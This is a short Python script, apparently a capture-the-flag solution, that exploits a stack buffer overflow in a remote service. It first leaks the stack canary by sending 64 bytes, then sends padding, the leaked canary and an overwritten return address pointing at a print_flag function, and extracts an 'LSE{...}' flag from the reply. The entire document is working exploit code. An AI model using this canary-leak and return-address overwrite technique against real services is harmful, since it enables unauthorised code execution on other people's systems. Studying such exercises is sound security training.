#!/usr/bin/python3

import sys
import socket
import time
import re

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server = (sys.argv[1], int(sys.argv[2]))
sock.connect(server)

try:


  message = "A" * 64 + "\n"
  sock.send(message.encode())

  data = sock.recv(68)
  canary = b'\x00' + data[-3:]
  message = "end" + "A"*61
  overflow = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4B\x88\x04\x08'

  sock.send(message.encode() + canary + overflow)
  time.sleep(1)
  data = sock.recv(65)
  message = b''
  while data is not None :
    data = None
    data = sock.recv(100, socket.MSG_DONTWAIT)
    message += data

  print('FLAG: ' + re.search('LSE{.*}', message.decode('ascii')))
  # print_flag 08 04 88 4B
except:
  print('FLAG: ' + re.search('LSE{.*}', message.decode('ascii')).group(0))
finally:
  sock.close()
